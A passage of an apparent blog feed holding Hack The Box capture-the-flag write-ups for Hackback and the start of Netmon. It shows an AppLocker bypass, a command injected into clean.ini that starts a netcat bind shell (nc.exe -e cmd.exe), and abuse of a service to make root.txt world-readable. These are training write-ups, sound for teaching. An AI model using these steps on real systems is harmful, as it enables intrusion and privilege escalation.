            &lt;span class=&quot;no&quot;&gt;STDERR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stderr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;    
    &lt;span class=&quot;nb&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Exiting with code &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;exitcode&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;then-i-uploaded-ncexe-to-cwindowssystem32spooldriverscolor-to-bypass-applocker-&quot;&gt;Then I uploaded &lt;code class=&quot;highlighter-rouge&quot;&gt;nc.exe&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;C:\windows\system32\spool\drivers\color\&lt;/code&gt; (to bypass applocker) :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/hackback# proxychains ./winrm2.rb 
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-&amp;lt;&amp;gt;-127.0.0.1:8888-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-10.10.10.128:5985-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-OK
PS hackback\simple@HACKBACK Documents&amp;gt; UPLOAD /root/Desktop/HTB/boxes/hackback/nc.exe C:\windows\system32\spool\drivers\color\nc.exe
Uploading /root/Desktop/HTB/boxes/hackback/nc.exe to C:\windows\system32\spool\drivers\color\nc.exe|S-chain|-&amp;lt;&amp;gt;-127.0.0.1:8888-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-10.10.10.128:5985-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-OK
|S-chain|-&amp;lt;&amp;gt;-127.0.0.1:8888-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-10.10.10.128:5985-&amp;lt;&amp;gt;&amp;lt;&amp;gt;-OK
26892 bytes of 51488 bytes copied
51488 bytes of 51488 bytes copied

OK
PS hackback\simple@HACKBACK Documents&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;after-that-i-used-simple-echo-commands-to-edit-cleanini-it-should-look-like-this-&quot;&gt;After that I used simple echo commands to edit &lt;code class=&quot;highlighter-rouge&quot;&gt;clean.ini&lt;/code&gt;. It should look like this :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[Main]
LifeTime=100
LogFile=c:\util\scripts\log.txt &amp;amp; cmd.exe /c C:\windows\system32\spool\drivers\color\nc.exe -lvp 1338 -e cmd.exe
Directory=c:\inetpub\logs\logfiles
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;this-way-we-can-get-a-bind-shell&quot;&gt;This way we can get a bind shell.&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS C:\util\scripts&amp;gt; echo [Main] &amp;gt; C:\util\scripts\clean.ini
echo [Main] &amp;gt; C:\util\scripts\clean.ini
PS C:\util\scripts&amp;gt; echo LifeTime=100 &amp;gt;&amp;gt; C:\util\scripts\clean.ini
echo LifeTime=100 &amp;gt;&amp;gt; C:\util\scripts\clean.ini
PS C:\util\scripts&amp;gt; echo &quot;LogFile=c:\util\scripts\log.txt &amp;amp; cmd.exe /c C:\windows\system32\spool\drivers\color\nc.exe -lvp 1338 -e cmd.exe&quot; &amp;gt;&amp;gt; C:\util\scripts\clean.ini                                          
echo &quot;LogFile=c:\util\scripts\log.txt &amp;amp; cmd.exe /c C:\windows\system32\spool\drivers\color\nc.exe -lvp 1338 -e cmd.exe&quot; &amp;gt;&amp;gt; C:\util\scripts\clean.ini                                                              
PS C:\util\scripts&amp;gt; echo &quot;Directory=c:\inetpub\logs\logfiles&quot; &amp;gt;&amp;gt; C:\util\scripts\clean.ini
echo &quot;Directory=c:\inetpub\logs\logfiles&quot; &amp;gt;&amp;gt; C:\util\scripts\clean.ini
PS C:\util\scripts&amp;gt; cat clean.ini
cat clean.ini
[Main]
LifeTime=100
LogFile=c:\util\scripts\log.txt &amp;amp; cmd.exe /c C:\windows\system32\spool\drivers\color\nc.exe -lvp 1338 -e cmd.exe                       Directory=c:\inetpub\logs\logfiles
PS C:\util\scripts&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;after-some-time-the-listener-starts-and-we-can-connect-to-port-1338-through-the-proxy-&quot;&gt;After some time the listener starts and we can connect to port 1338 through the proxy :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hackback/29.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;finally-we-owned-user-&quot;&gt;Finally we owned user !&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;userlogger-filesystem-access-as-system-root-flag&quot;&gt;UserLogger, Filesystem Access as System, Root Flag&lt;/h3&gt;
&lt;h4 id=&quot;after-getting-a-shell-as-hacker-i-did-my-regular-windows-enumeration-one-thing-i-wanted-to-check-was-the-services-i-remembered-the-services-list-i-got-from-port-6666-so-i-checked-that&quot;&gt;After getting a shell as &lt;code class=&quot;highlighter-rouge&quot;&gt;hacker&lt;/code&gt; I did my regular Windows enumeration, one thing I wanted to check was the services, I remembered the services list I got from port 6666 so I checked that.&lt;/h4&gt;
&lt;h4 id=&quot;i-noticed--a-strange-service-called-userlogger-&quot;&gt;I noticed  a strange service called &lt;code class=&quot;highlighter-rouge&quot;&gt;UserLogger&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;        &quot;name&quot;:  &quot;UserLogger&quot;,
        &quot;startname&quot;:  &quot;LocalSystem&quot;,
        &quot;displayname&quot;:  &quot;User Logger&quot;,
        &quot;status&quot;:  &quot;OK&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;so-i-checked-the-entry-of-that-service-in-registry-&quot;&gt;So I checked the entry of that service in registry :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:\&amp;gt;reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\UserLogger
reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\UserLogger

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\UserLogger
    Type    REG_DWORD    0x10
    Start    REG_DWORD    0x3
    ErrorControl    REG_DWORD    0x1
    ImagePath    REG_EXPAND_SZ    c:\windows\system32\UserLogger.exe
    ObjectName    REG_SZ    LocalSystem
    DisplayName    REG_SZ    User Logger
    Description    REG_SZ    This service is responsible for logging user activity

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\UserLogger\Security

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;description-says-its-responsible-for-logging-user-activity-i-tried-to-start-that-service-as-hacker-&quot;&gt;Description says it’s responsible for logging user activity. I tried to start that service as &lt;code class=&quot;highlighter-rouge&quot;&gt;hacker&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:\Windows\system32&amp;gt;sc start userlogger
sc start userlogger

SERVICE_NAME: userlogger
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 1368   
        FLAGS              :
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;hacker-was-allowed-to-start-and-stop-the-service-i-started-to-look-more-into-the-service-and-test-it-i-created-a-test-file-and-called-it-testtxt-then-i-started-the-service-and-gave-it-the-file-as-a-parameter--sc-start-userlogger-testtxt-it-created-a-new-file-called-testtxtlog-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;hacker&lt;/code&gt; was allowed to start and stop the service. I started to look more into the service and test it. I created a test file and called it &lt;code class=&quot;highlighter-rouge&quot;&gt;test.txt&lt;/code&gt; then I started the service and gave it the file as a parameter : &lt;code class=&quot;highlighter-rouge&quot;&gt;sc start userlogger test.txt&lt;/code&gt;. It created a new file called &lt;code class=&quot;highlighter-rouge&quot;&gt;test.txt.log&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:\Users\hacker\Documents&amp;gt;type test.txt.log
type test.txt.log

Logfile specified!
Service is starting
Service is running
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;nothing-interesting-however-when-i-checked-the-permissions-of-that-file-&quot;&gt;Nothing interesting, however when I checked the permissions of that file :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:\Users\hacker\Documents&amp;gt;cacls C:\Users\hacker\Documents\test.txt.log
cacls C:\Users\hacker\Documents\test.txt.log

C:\Users\hacker\Documents\test.txt.log Everyone: F
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;its-readable-by-everyone-this-means-we-can-use-this-service-to-read-anything-we-dont-have-access-to-but-how-will-we-do-that--it-adds-log-after-the-file-name-&quot;&gt;It’s readable by everyone. This means we can use this service to read anything we don’t have access to, but how will we do that ? it adds &lt;code class=&quot;highlighter-rouge&quot;&gt;.log&lt;/code&gt; after the file name ..&lt;/h4&gt;
&lt;h4 id=&quot;since-windows-doesnt-accept--in-filenames-we-can-try-to-read-roottxt-like-this--sc-start-userlogger-cusersadministratordesktoproottxt&quot;&gt;Since windows doesn’t accept &lt;code class=&quot;highlighter-rouge&quot;&gt;:&lt;/code&gt; in filenames we can try to read &lt;code class=&quot;highlighter-rouge&quot;&gt;root.txt&lt;/code&gt; like this : &lt;code class=&quot;highlighter-rouge&quot;&gt;sc start userlogger C:\users\administrator\desktop\root.txt:&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;when-it-tries-to-add-log-everything-after--will-be-removed-and-the-new-permissions-will-be-applied-to-roottxt-&quot;&gt;When it tries to add &lt;code class=&quot;highlighter-rouge&quot;&gt;.log&lt;/code&gt; everything after &lt;code class=&quot;highlighter-rouge&quot;&gt;:&lt;/code&gt; will be removed and the new permissions will be applied to &lt;code class=&quot;highlighter-rouge&quot;&gt;root.txt&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS C:\&amp;gt; cmd /c &quot;sc start userlogger 'c:\users\administrator\desktop\root.txt:'&quot;
cmd /c &quot;sc start userlogger 'c:\users\administrator\desktop\root.txt:'&quot;

SERVICE_NAME: userlogger
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 1368  
        FLAGS              : 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hackback/30.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-worked-and-we-are-able-to-read-roottxt-but-what-is-this--a-troll-&quot;&gt;It worked and we are able to read &lt;code class=&quot;highlighter-rouge&quot;&gt;root.txt&lt;/code&gt;. But what is this ? A troll ?&lt;/h4&gt;
&lt;h4 id=&quot;just-like-bighead-i-suspected-that-it-had-an-alternate-data-stream-but-without-using-streamsexe-i-tried-some-stuff-and-one-of-my-guesses-worked-&quot;&gt;Just like bighead I suspected that it had an alternate data stream, but without using &lt;code class=&quot;highlighter-rouge&quot;&gt;streams.exe&lt;/code&gt; I tried some stuff and one of my guesses worked :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;cat c:\users\administrator\desktop\root.txt:flag.txt&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/hackback/31.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-owned-root-&quot;&gt;And we owned root !&lt;/h4&gt;
&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
&lt;h4 id=&quot;dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---netmon&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/netmon/&quot;&gt;Hack The Box - Netmon&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;next-hack-the-box-write-up--hack-the-box---friendzone&quot;&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/friendzone/&quot;&gt;Hack The Box - Friendzone&lt;/a&gt;&lt;/h4&gt;
&lt;hr /&gt;</content><author><name></name></author><category term="Windows" /><category term="Windows Exploitation" /><category term="Web" /><category term="RCE" /><category term="php" /><category term="Pivoting" /><summary type="html">Quick Summary Hey guys today Hackback retired and here’s my write-up about it. Hackback was a very hard machine full of different steps and rabbit holes. It’s a Windows machine and its ip is 10.10.10.128, I added it to /etc/hosts as hackback.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC hackback.htb We got two http ports, 80 and 6666, I also ran a full scan but we’ll get to that later. HTTP I checked both ports, on 80 there was this donkey image : I ran gobuster and it got nothing. I couldn’t send a request to port 6666 from the browser so I used curl : root@kali:~/Desktop/HTB/boxes/hackback# curl http://hackback.htb:6666/ &quot;Missing Command!&quot; It says &quot;Missing Command!&quot; So I tried /help : root@kali:~/Desktop/HTB/boxes/hackback# curl http://hackback.htb:6666/help &quot;hello,proc,whoami,list,info,services,netsat,ipconfig&quot; It returned a list of what commands we can use. /whoami lists information about the user running this service, not really important. /list lists the files in the current directory : root@kali:~/Desktop/HTB/boxes/hackback# curl http://hackback.htb:6666/list [ { &quot;Name&quot;: &quot;aspnet_client&quot;, &quot;length&quot;: null }, { &quot;Name&quot;: &quot;default&quot;, &quot;length&quot;: null }, { &quot;Name&quot;: &quot;new_phish&quot;, &quot;length&quot;: null }, { &quot;Name&quot;: &quot;http.ps1&quot;, &quot;Length&quot;: 1867 }, { &quot;Name&quot;: &quot;iisstart.htm&quot;, &quot;Length&quot;: 703 }, { &quot;Name&quot;: &quot;iisstart.png&quot;, &quot;Length&quot;: 99710 } ] /info prints system information, we might need that : root@kali:~/Desktop/HTB/boxes/hackback# curl http://hackback.htb:6666/info { &quot;WindowsBuildLabEx&quot;: &quot;17763.1.amd64fre.rs5_release.180914-1434&quot;, &quot;WindowsCurrentVersion&quot;: &quot;6.3&quot;, &quot;WindowsEditionId&quot;: &quot;ServerStandard&quot;, &quot;WindowsInstallationType&quot;: &quot;Server&quot;, &quot;WindowsInstallDateFromRegistry&quot;: &quot;\/Date(1542436874000)\/&quot;, &quot;WindowsProductId&quot;: &quot;00429-00520-27817-AA520&quot;, &quot;WindowsProductName&quot;: &quot;Windows Server 2019 Standard&quot;, &quot;WindowsRegisteredOrganization&quot;: &quot;&quot;, &quot;WindowsRegisteredOwner&quot;: &quot;Windows User&quot;, &quot;WindowsSystemRoot&quot;: &quot;C:\\Windows&quot;, &quot;WindowsVersion&quot;: &quot;1809&quot;, &quot;BiosCharacteristics&quot;: null, &quot;BiosBIOSVersion&quot;: null, &quot;BiosBuildNumber&quot;: null, &quot;BiosCaption&quot;: null, &quot;BiosCodeSet&quot;: null, &quot;BiosCurrentLanguage&quot;: null, &quot;BiosDescription&quot;: null, &quot;BiosEmbeddedControllerMajorVersion&quot;: null, &quot;BiosEmbeddedControllerMinorVersion&quot;: null, &quot;BiosFirmwareType&quot;: null, &quot;BiosIdentificationCode&quot;: null, &quot;BiosInstallableLanguages&quot;: null, &quot;BiosInstallDate&quot;: null, &quot;BiosLanguageEdition&quot;: null, &quot;BiosListOfLanguages&quot;: null, &quot;BiosManufacturer&quot;: null, &quot;BiosName&quot;: null, &quot;BiosOtherTargetOS&quot;: null, &quot;BiosPrimaryBIOS&quot;: null, &quot;BiosReleaseDate&quot;: null, &quot;BiosSeralNumber&quot;: null, &quot;BiosSMBIOSBIOSVersion&quot;: null, &quot;BiosSMBIOSMajorVersion&quot;: null, &quot;BiosSMBIOSMinorVersion&quot;: null, &quot;BiosSMBIOSPresent&quot;: null, &quot;BiosSoftwareElementState&quot;: null, &quot;BiosStatus&quot;: null, &quot;BiosSystemBiosMajorVersion&quot;: null, &quot;BiosSystemBiosMinorVersion&quot;: null, &quot;BiosTargetOperatingSystem&quot;: null, &quot;BiosVersion&quot;: null, &quot;CsAdminPasswordStatus&quot;: null, &quot;CsAutomaticManagedPagefile&quot;: null, &quot;CsAutomaticResetBootOption&quot;: null, &quot;CsAutomaticResetCapability&quot;: null, &quot;CsBootOptionOnLimit&quot;: null, &quot;CsBootOptionOnWatchDog&quot;: null, &quot;CsBootROMSupported&quot;: null, &quot;CsBootStatus&quot;: null, &quot;CsBootupState&quot;: null, &quot;CsCaption&quot;: null, &quot;CsChassisBootupState&quot;: null, &quot;CsChassisSKUNumber&quot;: null, &quot;CsCurrentTimeZone&quot;: null, &quot;CsDaylightInEffect&quot;: null, &quot;CsDescription&quot;: null, &quot;CsDNSHostName&quot;: null, &quot;CsDomain&quot;: null, &quot;CsDomainRole&quot;: null, &quot;CsEnableDaylightSavingsTime&quot;: null, &quot;CsFrontPanelResetStatus&quot;: null, &quot;CsHypervisorPresent&quot;: null, &quot;CsInfraredSupported&quot;: null, &quot;CsInitialLoadInfo&quot;: null, &quot;CsInstallDate&quot;: null, &quot;CsKeyboardPasswordStatus&quot;: null, &quot;CsLastLoadInfo&quot;: null, &quot;CsManufacturer&quot;: null, &quot;CsModel&quot;: null, &quot;CsName&quot;: null, &quot;CsNetworkAdapters&quot;: null, &quot;CsNetworkServerModeEnabled&quot;: null, &quot;CsNumberOfLogicalProcessors&quot;: null, &quot;CsNumberOfProcessors&quot;: null, &quot;CsProcessors&quot;: null, &quot;CsOEMStringArray&quot;: null, &quot;CsPartOfDomain&quot;: null, &quot;CsPauseAfterReset&quot;: null, &quot;CsPCSystemType&quot;: null, &quot;CsPCSystemTypeEx&quot;: null, &quot;CsPowerManagementCapabilities&quot;: null, &quot;CsPowerManagementSupported&quot;: null, &quot;CsPowerOnPasswordStatus&quot;: null, &quot;CsPowerState&quot;: null, &quot;CsPowerSupplyState&quot;: null, &quot;CsPrimaryOwnerContact&quot;: null, &quot;CsPrimaryOwnerName&quot;: null, &quot;CsResetCapability&quot;: null, &quot;CsResetCount&quot;: null, &quot;CsResetLimit&quot;: null, &quot;CsRoles&quot;: null, &quot;CsStatus&quot;: null, &quot;CsSupportContactDescription&quot;: null, &quot;CsSystemFamily&quot;: null, &quot;CsSystemSKUNumber&quot;: null, &quot;CsSystemType&quot;: null, &quot;CsThermalState&quot;: null, &quot;CsTotalPhysicalMemory&quot;: null, &quot;CsPhyicallyInstalledMemory&quot;: null, &quot;CsUserName&quot;: null, &quot;CsWakeUpType&quot;: null, &quot;CsWorkgroup&quot;: null, &quot;OsName&quot;: null, &quot;OsType&quot;: null, &quot;OsOperatingSystemSKU&quot;: null, &quot;OsVersion&quot;: null, &quot;OsCSDVersion&quot;: null, &quot;OsBuildNumber&quot;: null, &quot;OsHotFixes&quot;: null, &quot;OsBootDevice&quot;: null, &quot;OsSystemDevice&quot;: null, &quot;OsSystemDirectory&quot;: null, &quot;OsSystemDrive&quot;: null, &quot;OsWindowsDirectory&quot;: null, &quot;OsCountryCode&quot;: null, &quot;OsCurrentTimeZone&quot;: null, &quot;OsLocaleID&quot;: null, &quot;OsLocale&quot;: null, &quot;OsLocalDateTime&quot;: null, &quot;OsLastBootUpTime&quot;: null, &quot;OsUptime&quot;: null, &quot;OsBuildType&quot;: null, &quot;OsCodeSet&quot;: null, &quot;OsDataExecutionPreventionAvailable&quot;: null, &quot;OsDataExecutionPrevention32BitApplications&quot;: null, &quot;OsDataExecutionPreventionDrivers&quot;: null, &quot;OsDataExecutionPreventionSupportPolicy&quot;: null, &quot;OsDebug&quot;: null, &quot;OsDistributed&quot;: null, &quot;OsEncryptionLevel&quot;: null, &quot;OsForegroundApplicationBoost&quot;: null, &quot;OsTotalVisibleMemorySize&quot;: null, &quot;OsFreePhysicalMemory&quot;: null, &quot;OsTotalVirtualMemorySize&quot;: null, &quot;OsFreeVirtualMemory&quot;: null, &quot;OsInUseVirtualMemory&quot;: null, &quot;OsTotalSwapSpaceSize&quot;: null, &quot;OsSizeStoredInPagingFiles&quot;: null, &quot;OsFreeSpaceInPagingFiles&quot;: null, &quot;OsPagingFiles&quot;: null, &quot;OsHardwareAbstractionLayer&quot;: null, &quot;OsInstallDate&quot;: null, &quot;OsManufacturer&quot;: null, &quot;OsMaxNumberOfProcesses&quot;: null, &quot;OsMaxProcessMemorySize&quot;: null, &quot;OsMuiLanguages&quot;: null, &quot;OsNumberOfLicensedUsers&quot;: null, &quot;OsNumberOfProcesses&quot;: null, &quot;OsNumberOfUsers&quot;: null, &quot;OsOrganization&quot;: null, &quot;OsArchitecture&quot;: null, &quot;OsLanguage&quot;: null, &quot;OsProductSuites&quot;: null, &quot;OsOtherTypeDescription&quot;: null, &quot;OsPAEEnabled&quot;: null, &quot;OsPortableOperatingSystem&quot;: null, &quot;OsPrimary&quot;: null, &quot;OsProductType&quot;: null, &quot;OsRegisteredUser&quot;: null, &quot;OsSerialNumber&quot;: null, &quot;OsServicePackMajorVersion&quot;: null, &quot;OsServicePackMinorVersion&quot;: null, &quot;OsStatus&quot;: null, &quot;OsSuites&quot;: null, &quot;OsServerLevel&quot;: 4, &quot;KeyboardLayout&quot;: null, &quot;TimeZone&quot;: &quot;(UTC-08:00) Pacific Time (US \u0026 Canada)&quot;, &quot;LogonServer&quot;: null, &quot;PowerPlatformRole&quot;: 1, &quot;HyperVisorPresent&quot;: null, &quot;HyperVRequirementDataExecutionPreventionAvailable&quot;: null, &quot;HyperVRequirementSecondLevelAddressTranslation&quot;: null, &quot;HyperVRequirementVirtualizationFirmwareEnabled&quot;: null, &quot;HyperVRequirementVMMonitorModeExtensions&quot;: null, &quot;DeviceGuardSmartStatus&quot;: 0, &quot;DeviceGuardRequiredSecurityProperties&quot;: null, &quot;DeviceGuardAvailableSecurityProperties&quot;: null, &quot;DeviceGuardSecurityServicesConfigured&quot;: null, &quot;DeviceGuardSecurityServicesRunning&quot;: null, &quot;DeviceGuardCodeIntegrityPolicyEnforcementStatus&quot;: null, &quot;DeviceGuardUserModeCodeIntegrityPolicyEnforcementStatus&quot;: null } /services lists the services, that’s also important and we might need it later : ``` root@kali:~/Desktop/HTB/boxes/hackback# curl http://hackback.htb:6666/services [ { “name”: “AJRouter”, “startname”: “NT AUTHORITY\LocalService”, “displayname”: “AllJoyn Router Service”, “status”: “OK” }, { “name”: “ALG”, “startname”: “NT AUTHORITY\LocalService”, “displayname”: “Application Layer Gateway Service”, “status”: “OK” }, { “name”: “AppHostSvc”, “startname”: “localSystem”, “displayname”: “Application Host Helper Service”, “status”: “OK” },</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/hackback/0.png" /></entry><entry><title type="html">Hack The Box - Netmon</title><link href="http://localhost:4000/hack-the-box/netmon/" rel="alternate" type="text/html" title="Hack The Box - Netmon" /><published>2019-06-29T00:00:00+02:00</published><updated>2019-06-29T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/netmon</id><content type="html" xml:base="http://localhost:4000/hack-the-box/netmon/">&lt;hr /&gt;

&lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
&lt;h4 id=&quot;hey-guys-today-netmon-retired-and-heres-my-writeup-about-it-it-was-a-very-easy-machine-thats-everything-i-can-say-about-it-its-a-windows-box-and-its-ip-is-101010152-i-added-it-to-etchosts-as-netmonhtb-lets-jump-right-in-&quot;&gt;Hey guys today Netmon retired and here’s my writeup about it. It was a very easy machine that’s everything I can say about it. It’s a Windows box and its ip is 10.10.10.152, I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;netmon.htb&lt;/code&gt;. Let’s jump right in !&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/netmon/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
&lt;h4 id=&quot;as-always-we-will-start-with-nmap-to-scan-for-open-ports-and-services-&quot;&gt;As always we will start with &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; to scan for open ports and services :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT -sC netmon.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/netmon/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-got-ftp-on-port-21-http-on-port-80-and-smb-the-most-interesting-thing-is-that-anonymous-login-is-allowed-on-ftp-and-obviously-its-running-on-c-&quot;&gt;We got &lt;code class=&quot;highlighter-rouge&quot;&gt;ftp&lt;/code&gt; on port 21, &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; on port 80 and &lt;code class=&quot;highlighter-rouge&quot;&gt;smb&lt;/code&gt;. The most interesting thing is that anonymous login is allowed on &lt;code class=&quot;highlighter-rouge&quot;&gt;ftp&lt;/code&gt; and obviously it’s running on &lt;code class=&quot;highlighter-rouge&quot;&gt;C:&lt;/code&gt; !&lt;/h4&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;ftp-user-flag&quot;&gt;FTP, User Flag&lt;/h3&gt;
&lt;h4 id=&quot;i-checked-that-ftp-server-and-got-the-user-flag-for-public-&quot;&gt;I checked that &lt;code class=&quot;highlighter-rouge&quot;&gt;ftp&lt;/code&gt; server and got the user flag for &lt;code class=&quot;highlighter-rouge&quot;&gt;Public&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/netmon# ftp netmon.htb
Connected to netmon.htb.
220 Microsoft FTP Service
Name (netmon.htb:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp&amp;gt; ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
02-03-19  12:18AM                 1024 .rnd
02-25-19  10:15PM       &amp;lt;DIR&amp;gt;          inetpub
07-16-16  09:18AM       &amp;lt;DIR&amp;gt;          PerfLogs
02-25-19  10:56PM       &amp;lt;DIR&amp;gt;          Program Files
